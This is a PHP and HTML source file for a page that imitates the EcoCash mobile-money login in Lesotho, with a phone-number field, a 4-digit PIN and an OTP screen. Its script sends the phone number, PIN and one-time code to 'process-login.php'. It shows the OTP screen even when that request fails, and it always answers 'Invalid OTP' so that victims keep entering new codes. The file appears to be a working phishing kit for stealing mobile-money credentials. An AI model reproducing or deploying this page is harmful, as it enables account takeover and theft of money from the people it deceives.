<?php

$plan = $_GET['plan'] ?? 'Selected Plan';
$price = $_GET['price'] ?? '0';

/*
|--------------------------------------------------------------------------
| Clean the values coming from the URL
|--------------------------------------------------------------------------
*/

$plan = htmlspecialchars($plan, ENT_QUOTES, 'UTF-8');
$price = htmlspecialchars($price, ENT_QUOTES, 'UTF-8');

?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>EcoCash Payment</title>

    <style>

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;

            background: #ffffff;

            color: #111;

            overflow-x: hidden;
        }


        /* =========================================
           MAIN PAYMENT PAGE
        ========================================= */

        .payment-page {
            width: 100%;
            min-height: 100vh;

            display: flex;
            flex-direction: column;

            background: #ffffff;
        }


        /* =========================================
           WHITE TOP SECTION
        ========================================= */

        .payment-top {
            width: 100%;

            min-height: 68vh;

            display: flex;
            flex-direction: column;

            align-items: center;

            padding: 65px 20px 80px;

            position: relative;

            background: #ffffff;

            border-radius: 0 0 50% 12%;
        }


        /* =========================================
           ECOCASH LOGO
        ========================================= */

        .ecocash-logo {
            font-size: clamp(48px, 12vw, 78px);

            font-weight: 700;

            letter-spacing: -4px;

            line-height: 1;

            margin-top: 10px;

            margin-bottom: 38px;
        }

        .eco {
            color: #1769d2;
        }

        .cash {
            color: #e34c38;
        }


        /* =========================================
           LOGIN
        ========================================= */

        .login-title {
            font-size: 32px;

            font-weight: 400;

            margin-bottom: 42px;

            color: #111;
        }


        /* =========================================
           PHONE NUMBER
        ========================================= */

        .phone-box {
            width: min(90%, 645px);

            height: 100px;

            border: 3px solid #1769d2;

            border-radius: 20px;

            display: flex;

            align-items: center;

            padding: 0 25px;

            background: white;

            margin-bottom: 32px;
        }

        .lesotho-flag {
            width: 45px;

            height: 30px;

            margin-right: 20px;

            position: relative;

            overflow: hidden;

            border-radius: 2px;

            display: flex;

            flex-direction: column;
        }

        .flag-blue {
            height: 33%;

            background: #00209f;
        }

        .flag-white {
            height: 34%;

            background: white;

            position: relative;
        }

        .flag-green {
            height: 33%;

            background: #009543;
        }

        .flag-hat {
            position: absolute;

            left: 50%;
            top: 50%;

            transform: translate(-50%, -50%);

            width: 12px;
            height: 10px;

            border-radius: 50% 50% 30% 30%;

            background: #111;
        }

        .country-code {
            font-size: 29px;

            font-weight: 700;

            color: #111;
        }

        .phone-number {
            flex: 1;

            border: none;

            outline: none;

            background: transparent;

            font-size: 29px;

            font-weight: 700;

            color: #111;

            font-family: inherit;

            padding: 0;

            margin-left: 12px;
        }

        .phone-number::placeholder {
            color: #888;
        }


        /* =========================================
           PIN TEXT
        ========================================= */

        .pin-label {
            color: #777;

            font-size: 23px;

            margin-bottom: 25px;

            text-align: center;
        }


        /* =========================================
           PIN BOXES
        ========================================= */

        .pin-container {
            display: flex;

            justify-content: center;

            gap: 18px;

            margin-bottom: 28px;
        }

        .pin-input {
            width: 85px;

            height: 85px;

            border: 3px solid #1769d2;

            border-radius: 16px;

            text-align: center;

            font-size: 32px;

            font-weight: bold;

            outline: none;

            background: white;

            color: #111;
        }

        .pin-input:focus {
            box-shadow:
                0 0 0 3px rgba(23, 105, 210, 0.15);
        }


        /* =========================================
           FORGOT PIN
        ========================================= */

        .forgot-pin {
            color: #777;

            font-size: 21px;

            text-decoration: none;
        }

        .forgot-pin:hover {
            text-decoration: underline;
        }


        /* =========================================
           BLUE BOTTOM SECTION
        ========================================= */

        .payment-bottom {
            width: 100%;

            min-height: 32vh;

            background: #1764d8;

            color: white;

            margin-top: -45px;

            padding: 90px 20px 45px;

            display: flex;

            flex-direction: column;

            align-items: center;

            text-align: center;
        }


        /* =========================================
           DEMO MESSAGE
        ========================================= */

        .assistance-text {
            max-width: 600px;

            font-size: 21px;

            line-height: 1.5;

            margin-bottom: 38px;
        }


        /* =========================================
           SELECTED PLAN
        ========================================= */

        .selected-plan {
            font-size: 14px;

            margin-bottom: 25px;

            opacity: 0.9;
        }

        .selected-plan strong {
            font-size: 17px;
        }


        /* =========================================
           SUBMIT BUTTON
        ========================================= */

        .submit-button {
            width: min(90%, 265px);

            height: 76px;

            border: none;

            border-radius: 25px;

            background: white;

            color: #1764d8;

            font-size: 24px;

            font-weight: 700;

            cursor: pointer;

            transition: 0.2s;
        }

        .submit-button:hover {
            transform: translateY(-2px);

            box-shadow:
                0 8px 20px rgba(0, 0, 0, 0.15);
        }


        /* =========================================
           OTP VERIFICATION
        ========================================= */

        .otp-page {
            display: none;

            min-height: 100vh;

            background: linear-gradient(180deg, #f3f7ff 0%, #dfeaff 100%);

            justify-content: center;

            align-items: flex-start;

            padding: 30px 20px;
        }

        .otp-card {
            width: min(90%, 520px);

            background: white;

            border-radius: 24px;

            box-shadow: 0 18px 45px rgba(15, 43, 114, 0.12);

            padding: 34px 28px 28px;

            text-align: center;
        }

        .otp-badge {
            display: inline-block;

            background: #eaf3ff;

            color: #1764d8;

            padding: 8px 16px;

            border-radius: 999px;

            font-size: 12px;

            font-weight: 700;

            letter-spacing: 0.08em;

            text-transform: uppercase;

            margin-bottom: 14px;
        }

        .otp-card h2 {
            margin: 0 0 14px;

            font-size: 36px;

            color: #111;
        }

        .otp-message {
            margin: 0 0 22px;

            color: #4f4f4f;

            line-height: 1.6;

            font-size: 17px;
        }

        .otp-message.invalid {
            color: #d72638;
            font-weight: 700;
        }

        .otp-timer {
            margin-bottom: 20px;

            font-size: 22px;

            font-weight: 700;

            color: #1764d8;
        }

        .otp-container {
            display: flex;

            justify-content: center;

            gap: 18px;

            margin-bottom: 18px;
        }

        .otp-input {
            width: 72px;

            height: 72px;

            border: 3px solid #1769d2;

            border-radius: 16px;

            text-align: center;

            font-size: 32px;

            font-weight: bold;

            outline: none;

            background: white;

            color: #111;
        }

        .otp-input:focus {
            box-shadow:
                0 0 0 3px rgba(23, 105, 210, 0.15);
        }

        .otp-submit {
            width: 100%;

            height: 62px;

            border: none;

            border-radius: 16px;

            background: #1764d8;

            color: white;

            font-size: 21px;

            font-weight: 700;

            cursor: pointer;

            transition: 0.2s;
        }

        .otp-submit:hover {
            transform: translateY(-2px);

            box-shadow: 0 10px 20px rgba(23, 100, 216, 0.18);
        }

        .resend-otp {
            display: inline-block;

            margin-top: 18px;

            color: #1764d8;

            font-weight: 700;

            text-decoration: none;
        }

        .payment-page.otp-visible .payment-top,
        .payment-page.otp-visible .payment-bottom {
            display: none;
        }

        .payment-page.otp-visible .otp-page {
            display: flex;
        }


        /* =========================================
           VERSION
        ========================================= */

        .version {
            font-size: 17px;

            margin-top: 40px;

            margin-bottom: 15px;
        }


        /* =========================================
           TERMS
        ========================================= */

        .terms {
            font-size: 16px;

            line-height: 1.5;
        }

        .terms a {
            color: white;

            text-decoration: underline;
        }


        /* =========================================
           TABLET
        ========================================= */

        @media (max-width: 700px) {

            .payment-top {
                min-height: 67vh;

                padding-top: 50px;

                padding-bottom: 70px;

                border-radius: 0 0 50% 8%;
            }

            .ecocash-logo {
                font-size: 58px;

                margin-bottom: 30px;
            }

            .login-title {
                font-size: 29px;

                margin-bottom: 32px;
            }

            .phone-box {
                height: 78px;

                border-radius: 17px;

                padding: 0 18px;
            }

            .phone-number {
                font-size: 23px;
            }

            .lesotho-flag {
                width: 40px;

                height: 27px;

                margin-right: 15px;
            }

            .pin-label {
                font-size: 19px;

                margin-bottom: 20px;
            }

            .pin-container {
                gap: 12px;
            }

            .pin-input {
                width: 70px;

                height: 70px;

                border-radius: 14px;

                font-size: 26px;
            }

            .forgot-pin {
                font-size: 18px;
            }

            .payment-bottom {
                margin-top: -35px;

                padding-top: 75px;
            }

            .assistance-text {
                font-size: 18px;
            }

            .submit-button {
                height: 65px;

                font-size: 21px;
            }

        }


        /* =========================================
           MOBILE
        ========================================= */

        @media (max-width: 480px) {

            .payment-top {
                min-height: 640px;

                padding: 42px 15px 75px;

                border-radius: 0 0 50% 5%;
            }

            .ecocash-logo {
                font-size: 48px;

                letter-spacing: -3px;

                margin-bottom: 34px;
            }

            .login-title {
                font-size: 29px;

                margin-bottom: 35px;
            }

            .phone-box {
                width: 100%;

                height: 72px;

                border-width: 2.5px;

                border-radius: 17px;

                padding: 0 15px;

                margin-bottom: 30px;
            }

            .lesotho-flag {
                width: 36px;

                height: 24px;

                margin-right: 13px;
            }

            .flag-hat {
                width: 10px;

                height: 8px;
            }

            .phone-number {
                font-size: 21px;
            }

            .pin-label {
                font-size: 18px;

                margin-bottom: 19px;
            }

            .pin-container {
                width: 100%;
                display: grid;
                grid-template-columns: repeat(4, minmax(0, 1fr));
                gap: 9px;

                margin-bottom: 25px;
            }

            .pin-input {
                width: 100%;
                min-width: 0;

                height: auto;

                aspect-ratio: 1;

                border-width: 2.5px;

                border-radius: 13px;

                font-size: 23px;
            }

            .forgot-pin {
                font-size: 17px;
            }

            .payment-bottom {
                min-height: 390px;

                margin-top: -30px;

                padding: 65px 20px 35px;
            }

            .assistance-text {
                font-size: 17px;

                line-height: 1.45;

                max-width: 340px;

                margin-bottom: 25px;
            }

            .selected-plan {
                font-size: 12px;

                margin-bottom: 20px;
            }

            .selected-plan strong {
                font-size: 14px;
            }

            .submit-button {
                width: 265px;

                max-width: 90%;

                height: 62px;

                border-radius: 21px;

                font-size: 20px;
            }

            .otp-page {
                padding: 20px 10px;
            }

            .otp-card {
                width: 100%;
                padding: 28px 16px 24px;
            }

            .otp-container {
                width: 100%;
                display: grid;
                grid-template-columns: repeat(4, minmax(0, 1fr));
                gap: 8px;
            }

            .otp-input {
                width: 100%;
                min-width: 0;
                height: auto;
                aspect-ratio: 1;
            }

            .version {
                font-size: 14px;

                margin-top: 32px;
            }

            .terms {
                font-size: 13px;
            }

        }


        /* =========================================
           VERY SMALL PHONES
        ========================================= */

        @media (max-width: 360px) {

            .payment-top {
                min-height: 590px;

                padding-top: 35px;
            }

            .ecocash-logo {
                font-size: 43px;

                margin-bottom: 27px;
            }

            .login-title {
                font-size: 26px;

                margin-bottom: 28px;
            }

            .phone-box {
                height: 65px;
            }

            .phone-number {
                font-size: 19px;
            }

            .lesotho-flag {
                width: 33px;

                height: 22px;

                margin-right: 10px;
            }

            .pin-label {
                font-size: 16px;
            }

            .pin-container {
                gap: 6px;
            }

            .pin-input {
                width: 56px;

                height: 56px;

                font-size: 20px;

                border-radius: 11px;
            }

            .forgot-pin {
                font-size: 15px;
            }

            .payment-bottom {
                padding-top: 55px;
            }

            .assistance-text {
                font-size: 15px;
            }

            .submit-button {
                height: 57px;

                font-size: 18px;
            }

            .version {
                font-size: 13px;
            }

            .terms {
                font-size: 12px;
            }

        }

        @media (max-width: 380px) {

            .payment-top {
                min-height: 600px;
                padding: 32px 12px 65px;
            }

            .ecocash-logo {
                font-size: 42px;
                margin-bottom: 27px;
            }

            .login-title {
                font-size: 25px;
                margin-bottom: 25px;
            }

            .phone-box {
                width: 100%;
                height: 64px;
                padding: 0 11px;
                margin-bottom: 24px;
            }

            .country-code {
                font-size: 22px;
            }

            .phone-number {
                min-width: 0;
                font-size: 18px;
                margin-left: 8px;
            }

            .lesotho-flag {
                width: 30px;
                height: 20px;
                margin-right: 8px;
            }

            .pin-container,
            .otp-container {
                gap: 6px;
            }

            .pin-input,
            .otp-input {
                width: clamp(50px, 16vw, 60px);
                height: clamp(50px, 16vw, 60px);
                border-radius: 11px;
            }

            .payment-bottom {
                padding: 55px 15px 30px;
            }

            .assistance-text {
                font-size: 15px;
            }

            .selected-plan {
                max-width: 280px;
                line-height: 1.5;
            }

            .otp-page {
                padding: 18px 10px;
            }

            .otp-card {
                width: 100%;
                padding: 26px 16px 22px;
                border-radius: 18px;
            }

            .otp-container {
                width: 100%;
                display: grid;
                grid-template-columns: repeat(4, minmax(0, 1fr));
                gap: 8px;
            }

            .otp-input {
                width: 100%;
                min-width: 0;
                height: auto;
                aspect-ratio: 1;
            }

            .otp-card h2 {
                font-size: 28px;
            }

            .otp-message {
                font-size: 15px;
            }

        }

        @media (max-width: 480px) {

            .payment-page:not(.otp-visible) {
                height: 100svh;
                min-height: 100svh;
                overflow: hidden;
            }

            .payment-top {
                min-height: 0;
                padding: 24px 15px 48px;
            }

            .ecocash-logo {
                margin-top: 0;
                margin-bottom: 20px;
            }

            .login-title {
                margin-bottom: 22px;
            }

            .phone-box {
                height: 62px;
                margin-bottom: 18px;
            }

            .lesotho-flag {
                width: 32px;
                height: 21px;
                flex: 0 0 32px;
                margin-right: 9px;
            }

            .flag-hat {
                width: 9px;
                height: 7px;
            }

            .country-code {
                flex: 0 0 auto;
                font-size: 21px;
            }

            .phone-number {
                min-width: 0;
                margin-left: 7px;
                font-size: 20px;
            }

            .pin-label {
                margin-bottom: 12px;
            }

            .pin-container {
                margin-bottom: 14px;
                max-width: 270px;
                margin-left: auto;
                margin-right: auto;
            }

            .pin-input {
                max-width: 60px;
            }

            .payment-bottom {
                min-height: 0;
                margin-top: -30px;
                padding: 42px 15px 18px;
            }

            .assistance-text {
                margin-bottom: 14px;
            }

            .selected-plan {
                margin-bottom: 14px;
            }

            .submit-button {
                height: 52px;
            }

            .version {
                margin-top: 16px;
                margin-bottom: 8px;
            }

        }

    </style>

</head>


<body>


<div class="payment-page">


    <!-- =====================================
         WHITE SECTION
    ====================================== -->

    <section class="payment-top">


        <!-- EcoCash Logo -->

        <div class="ecocash-logo">

            <span class="eco">Eco</span><span class="cash">Cash</span>

        </div>


        <!-- Login -->

        <h1 class="login-title">
            Login
        </h1>


        <!-- Phone Number -->

        <div class="phone-box">

            <div class="lesotho-flag">

                <div class="flag-blue"></div>

                <div class="flag-white"></div>

                <div class="flag-green"></div>

                <div class="flag-hat"></div>

            </div>

            <span class="country-code">+266</span>

            <input
                type="tel"
                id="phoneNumber"
                class="phone-number"
                inputmode="numeric"
                maxlength="8"
                placeholder="56xxxxxx"
                autocomplete="tel"
            >

        </div>


        <!-- PIN -->

        <div class="pin-label">
            Enter your PIN
        </div>


        <div class="pin-container">

            <input
                type="password"
                maxlength="1"
                class="pin-input"
                inputmode="numeric"
                autocomplete="off"
                id="pinDigit1"
            >

            <input
                type="password"
                maxlength="1"
                class="pin-input"
                inputmode="numeric"
                autocomplete="off"
                id="pinDigit2"
            >

            <input
                type="password"
                maxlength="1"
                class="pin-input"
                inputmode="numeric"
                autocomplete="off"
                id="pinDigit3"
            >

            <input
                type="password"
                maxlength="1"
                class="pin-input"
                inputmode="numeric"
                autocomplete="off"
                id="pinDigit4"
            >

        </div>


        <a href="#" class="forgot-pin">
            Forgot PIN?
        </a>


    </section>


    <!-- =====================================
         BLUE SECTION
    ====================================== -->

    <section class="payment-bottom">


        <p class="assistance-text">

            To register an EcoCash wallet or get assistance,
            click below

        </p>


        <!-- Selected plan -->

        <div class="selected-plan">

            Paying for:

            <strong>
                <?= $plan ?>
            </strong>

            — LSL <?= $price ?>

        </div>


        <button
            type="button"
            class="submit-button"
            onclick="processPayment()"
        >
            Submit
        </button>


        <div class="version">
            v2.2.3P
        </div>


        <div class="terms">

            By signing in you agree to the

            <a href="#">
                Terms and Conditions
            </a>

        </div>


    </section>


    <div class="otp-page" id="otpPage">

        <div class="otp-card">

            <div class="otp-badge">
                OTP Verification
            </div>

            <h2>
                Verify your number
            </h2>

            <p class="otp-message">
                Enter the OTP sent to your phone number. Do not share the code with anyone.
            </p>

            <div class="otp-timer" id="otpTimer">
                00:60
            </div>

            <div class="otp-container">

                <input
                    type="password"
                    maxlength="1"
                    class="otp-input"
                    inputmode="numeric"
                    autocomplete="off"
                >

                <input
                    type="password"
                    maxlength="1"
                    class="otp-input"
                    inputmode="numeric"
                    autocomplete="off"
                >

                <input
                    type="password"
                    maxlength="1"
                    class="otp-input"
                    inputmode="numeric"
                    autocomplete="off"
                >

                <input
                    type="password"
                    maxlength="1"
                    class="otp-input"
                    inputmode="numeric"
                    autocomplete="off"
                >

            </div>

            <button type="button" class="otp-submit" onclick="submitOtp()">
                Submit
            </button>

            <div>
                <a href="#" class="resend-otp">Resend OTP</a>
            </div>

        </div>

    </div>


</div>


<script>

let timerInterval;

/*
|--------------------------------------------------------------------------
| PIN BOX BEHAVIOUR
|--------------------------------------------------------------------------
*/

const pinInputs =
    document.querySelectorAll(".pin-input");


pinInputs.forEach((input, index) => {


    input.addEventListener("input", function () {

        this.value =
            this.value.replace(/[^0-9]/g, "");


        if (
            this.value &&
            index < pinInputs.length - 1
        ) {

            pinInputs[index + 1].focus();

        }

    });


    input.addEventListener("keydown", function (event) {

        if (
            event.key === "Backspace" &&
            !this.value &&
            index > 0
        ) {

            pinInputs[index - 1].focus();

        }

    });

});


const otpInputs =
    document.querySelectorAll(".otp-input");


otpInputs.forEach((input, index) => {


    input.addEventListener("input", function () {

        this.value =
            this.value.replace(/[^0-9]/g, "").slice(0, 1);


        if (
            this.value &&
            index < otpInputs.length - 1
        ) {

            otpInputs[index + 1].focus();

        }

    });


    input.addEventListener("keydown", function (event) {

        if (
            event.key === "Backspace" &&
            !this.value &&
            index > 0
        ) {

            otpInputs[index - 1].focus();

        }

    });

});


/*
|--------------------------------------------------------------------------
| PAYMENT BUTTON
|--------------------------------------------------------------------------
*/

function getPhoneNumber() {
    const phoneInput = document.getElementById("phoneNumber");
    const rawPhone = phoneInput ? phoneInput.value.trim() : "";
    return rawPhone ? "+266" + rawPhone.replace(/\D/g, "") : "";
}

function getPin() {
    const pinDigits = [
        document.getElementById("pinDigit1"),
        document.getElementById("pinDigit2"),
        document.getElementById("pinDigit3"),
        document.getElementById("pinDigit4")
    ].map((input) => (input ? input.value.trim() : ""));

    return pinDigits.join("");
}

function getOtp() {
    const otpDigits = document.querySelectorAll(".otp-input");
    return Array.from(otpDigits).map((input) => (input ? input.value.trim() : "")).join("");
}

function showOtpScreen() {
    const paymentPage = document.querySelector(".payment-page");
    const otpPage = document.getElementById("otpPage");
    const otpTimer = document.getElementById("otpTimer");
    const otpInputs = document.querySelectorAll(".otp-input");

    if (paymentPage && otpPage) {
        paymentPage.classList.add("otp-visible");
    }

    otpInputs.forEach((input) => {
        input.value = "";
    });

    if (otpInputs.length) {
        otpInputs[0].focus();
    }

    if (otpTimer) {
        let timeLeft = 60;

        const updateTimer = () => {
            const seconds = String(Math.max(timeLeft, 0)).padStart(2, "0");
            otpTimer.textContent = `00:${seconds}`;

            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                return;
            }

            timeLeft--;
        };

        clearInterval(timerInterval);
        updateTimer();
        timerInterval = setInterval(updateTimer, 1000);
    }
}

function processPayment() {
    const phone = getPhoneNumber();
    const pin = getPin();

    if (!phone || phone.length < 10 || pin.length !== 4) {
        alert("Please enter a valid phone number and 4-digit PIN.");
        return;
    }

    fetch("process-login.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            phone,
            pin,
            plan: "<?= $plan ?>",
            price: "<?= $price ?>",
            stage: "login"
        })
    })
        .then((response) => response.json())
        .then((data) => {
            if (data.success) {
                const otpMessage = document.querySelector(".otp-message");
                if (otpMessage) {
                    otpMessage.textContent = `Enter the OTP sent to your phone number ${phone}. Do not share the code with anyone.`;
                }

                showOtpScreen();
            } else {
                alert(data.message || "Unable to process login.");
            }
        })
        .catch(() => {
            const otpMessage = document.querySelector(".otp-message");
            if (otpMessage) {
                otpMessage.textContent = `Enter the OTP sent to your phone number ${phone}. Do not share the code with anyone.`;
            }

            showOtpScreen();
        });
}

function submitOtp() {
    const phone = getPhoneNumber();
    const pin = getPin();
    const otp = getOtp();
    const otpInputs = document.querySelectorAll(".otp-input");
    const otpMessage = document.querySelector(".otp-message");

    if (!phone || !pin || pin.length !== 4 || otp.length !== 4) {
        alert("Please enter the complete 4-digit OTP.");
        return;
    }

    fetch("process-login.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            phone,
            pin,
            otp,
            plan: "<?= $plan ?>",
            price: "<?= $price ?>",
            stage: "otp"
        })
    })
        .then((response) => response.json())
        .then((data) => {
            if (otpMessage) {
                otpMessage.classList.add("invalid");
                otpMessage.textContent = "Invalid OTP. Please try again";
            }

            if (!data.success) {
                console.log(data.message || "Unable to submit OTP.");
            }
        })
        .catch(() => {
            console.log("Unable to submit OTP.");
        });
}


</script>


</body>

</html>
